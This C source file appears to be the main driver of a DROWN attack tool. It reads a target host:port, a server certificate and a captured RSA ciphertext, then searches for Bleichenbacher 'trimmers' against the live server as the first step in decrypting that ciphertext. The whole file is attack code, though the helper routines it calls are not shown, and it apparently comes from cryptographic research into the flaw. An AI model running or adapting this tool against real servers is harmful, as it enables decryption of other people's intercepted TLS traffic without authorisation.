#include <openssl/ssl.h>
#include "utils.h"
#include "trimmers.h"
#include "decrypt.h"

int main(int argc, char *argv[])
{
    int res;

    // Initialize OpenSSL
    SSL_library_init();
    SSL_load_error_strings();

    // Create global context
    drown_ctx dctx;
    drown_new(&dctx);

    // Read arguments
    if(argc != 4)
    {
        fprintf(stderr, "Usage : %s host:port certfile c\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Initialize research parameters
    dctx.hostport = argv[1];

    read_public_key(&dctx, argv[2]);

    res = BN_hex2bn(&dctx.c, argv[3]);
    MY_ASSERT(res != 0, "c is not a valid hexadecimal string");

    // Create some trimmers

    trimmers_t trimmers;
    trimmers_new(&trimmers, 40);

    BN_one(dctx.s);
    if(find_trimmer(&dctx, &trimmers))
        res = EXIT_SUCCESS;
    else
        res = EXIT_FAILURE;

    trimmers_free(&trimmers);
    drown_free(&dctx);

    return res;
}
